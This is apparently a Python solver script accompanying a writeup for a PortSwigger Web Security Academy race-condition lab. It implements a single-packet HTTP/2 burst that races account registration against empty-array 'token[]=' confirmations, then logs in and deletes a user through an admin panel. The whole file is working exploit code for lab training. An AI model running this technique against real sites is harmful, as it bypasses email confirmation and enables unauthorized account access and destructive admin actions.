#!/usr/bin/env python3
"""
Partial construction race conditions
PortSwigger Web Security Academy -- Race Conditions

Companion script for the writeup: 06-partial-construction-race-conditions.md

What this does:
    Exploits the window between a user row being INSERTed (account created,
    confirmation-token column not yet set) and a follow-up UPDATE assigning
    the real token. PHP's loose (==) comparison treats an empty array as
    equal to NULL, so POST /confirm?token[]= -- parsed server-side as an
    empty array rather than an empty string -- matches the token column
    during that brief window. Each attempt sends one registration request
    (random racerXXXXXX username, a fresh CSRF token and session pulled from
    a clean GET /register) together with twenty confirmation requests, all
    built as HTTP/2 HEADERS/DATA frames on the same h2 connection and flushed
    in a single sock.sendall() -- the identical single-packet mechanism used
    for the limit-overrun lab, spreading confirmation attempts across the
    whole registration-processing window rather than trying to precisely
    delay one confirmation relative to one registration. The race is
    probabilistic (roughly 1 in 25 attempts catches the window), so this
    retries with a fresh username and fresh CSRF/session every round.

Usage:
    python 06-partial-construction-race-conditions.py <lab-url>

Requirements:
    pip install httpx h2
"""

import random
import re
import socket
import ssl
import string
import sys
import urllib.parse

import httpx
import h2.config
import h2.connection
import h2.events

CONFIRM_COUNT = 20
MAX_ATTEMPTS = 300
PASSWORD = "password123"


def _csrf(html_text: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html_text)
    return m.group(1) if m else ""


def _h2_burst(host: str, port: int, requests: list[dict], timeout: float = 8.0) -> list[tuple[int, dict, bytes]]:
    """Same single-packet h2 engine as the limit-overrun lab. Here the burst
    mixes ONE registration request with twenty confirmation requests -- the
    single TCP write still guarantees all twenty-one land together, spreading
    the confirmation attempts across the registration's whole processing
    window instead of needing to time a single confirmation precisely."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.create_connection((host, port), timeout=timeout)
    sock = ctx.wrap_socket(sock, server_hostname=host)
    if sock.selected_alpn_protocol() != "h2":
        sock.close()
        raise RuntimeError(f"Server does not support HTTP/2 (got: {sock.selected_alpn_protocol()})")

    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    stream_ids = []
    for req in requests:
        hdrs = [
            (":method", req.get("method", "POST")),
            (":path", req["path"]),
            (":authority", host),
            (":scheme", "https"),
        ]
        for k, v in req.get("headers", {}).items():
            hdrs.append((k.lower(), v))
        body = req.get("body", "").encode() if isinstance(req.get("body", ""), str) else req.get("body", b"")
        sid = conn.get_next_available_stream_id()
        stream_ids.append(sid)
        if body:
            conn.send_headers(sid, hdrs, end_stream=False)
            conn.send_data(sid, body, end_stream=True)
        else:
            conn.send_headers(sid, hdrs, end_stream=True)

    # conn.data_to_send() batches every queued frame; one sock.sendall() = one packet
    sock.sendall(conn.data_to_send())

    responses: dict[int, dict] = {}
    done_streams = set()
    sock.settimeout(timeout)
    while len(done_streams) < len(stream_ids):
        try:
            data = sock.recv(65535)
        except socket.timeout:
            break
        if not data:
            break
        for event in conn.receive_data(data):
            if isinstance(event, h2.events.ResponseReceived):
                sid = event.stream_id
                resp_headers = {
                    (k.decode() if isinstance(k, bytes) else k): (v.decode() if isinstance(v, bytes) else v)
                    for k, v in event.headers
                }
                responses.setdefault(sid, {"headers": {}, "data": b"", "status": 0})
                responses[sid]["status"] = int(resp_headers.get(":status", "0"))
                responses[sid]["headers"] = resp_headers
            elif isinstance(event, h2.events.DataReceived):
                sid = event.stream_id
                if sid in responses:
                    responses[sid]["data"] += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, sid)
            elif isinstance(event, (h2.events.StreamEnded, h2.events.StreamReset)):
                done_streams.add(event.stream_id)
        sock.sendall(conn.data_to_send())

    conn.close_connection()
    sock.sendall(conn.data_to_send())
    sock.close()

    result = []
    for sid in stream_ids:
        r = responses.get(sid, {"status": 0, "headers": {}, "data": b""})
        result.append((r["status"], r["headers"], r["data"]))
    return result


def solve(lab_url: str) -> None:
    parsed = urllib.parse.urlparse(lab_url)
    host, port = parsed.hostname, parsed.port or 443

    for attempt in range(1, MAX_ATTEMPTS + 1):
        suffix = "".join(random.choices(string.ascii_lowercase, k=6))
        username = f"racer{suffix}"
        email = f"{username}@ginandjuice.shop"

        reg_client = httpx.Client(http2=True, follow_redirects=False, timeout=10)
        r = reg_client.get(f"{lab_url}/register")
        csrf = _csrf(r.text)
        session = ""
        for cookie_hdr in r.headers.get_list("set-cookie"):
            if "phpsessionid=" in cookie_hdr.lower():
                m = re.search(r'phpsessionid=([^;]+)', cookie_hdr, re.IGNORECASE)
                if m:
                    session = m.group(1)
        reg_client.close()

        if not csrf:
            if attempt % 20 == 0:
                print(f"  [{attempt}] No CSRF token found on /register, retrying")
            continue

        requests = [{
            "method": "POST",
            "path": "/register",
            "headers": {
                "content-type": "application/x-www-form-urlencoded",
                "cookie": f"phpsessionid={session}",
            },
            "body": f"csrf={csrf}&username={username}&email={email}&password={PASSWORD}",
        }]
        for _ in range(CONFIRM_COUNT):
            requests.append({
                "method": "POST",
                "path": "/confirm?token[]=",
                "headers": {"content-type": "application/x-www-form-urlencoded"},
                "body": "",
            })

        try:
            results = _h2_burst(host, port, requests)
        except Exception as e:
            if attempt % 20 == 0:
                print(f"  [{attempt}] H2 burst error: {e}")
            continue

        if not results:
            continue

        won = False
        for i, (status, _, body) in enumerate(results[1:]):
            body_str = body.decode(errors="replace").lower() if isinstance(body, bytes) else str(body).lower()
            if status == 200 or "successful" in body_str or "confirmed" in body_str:
                print(f"\n[+] RACE WON on attempt {attempt}, confirmation #{i} of {CONFIRM_COUNT}")
                print(f"    Username: {username}  Password: {PASSWORD}")
                won = True
                break

        if won:
            login_client = httpx.Client(http2=True, follow_redirects=True, timeout=10)
            login_csrf = _csrf(login_client.get(f"{lab_url}/login").text)
            login_client.post(f"{lab_url}/login", data={
                "csrf": login_csrf, "username": username, "password": PASSWORD,
            })

            admin_r = login_client.get(f"{lab_url}/admin")
            if admin_r.status_code == 200 and "carlos" in admin_r.text:
                del_csrf = _csrf(admin_r.text)
                login_client.post(f"{lab_url}/admin/delete", data={"csrf": del_csrf, "username": "carlos"})

            check = login_client.get(lab_url)
            if "Congratulations" in check.text:
                print("[+] Lab solved -- confirmed an unowned account via the NULL-token race and deleted carlos.")
            else:
                print("[-] Registered/confirmed but lab not flagged solved -- verify admin access manually.")
            return

        if attempt % 10 == 0:
            reg_status = results[0][0]
            confirm_statuses = sorted(set(r[0] for r in results[1:]))
            print(f"  [{attempt}] reg={reg_status} confirm_statuses={confirm_statuses}")

    print(f"[-] Not solved after {MAX_ATTEMPTS} attempts. Re-run -- the window is roughly 1 in 25 attempts wide.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
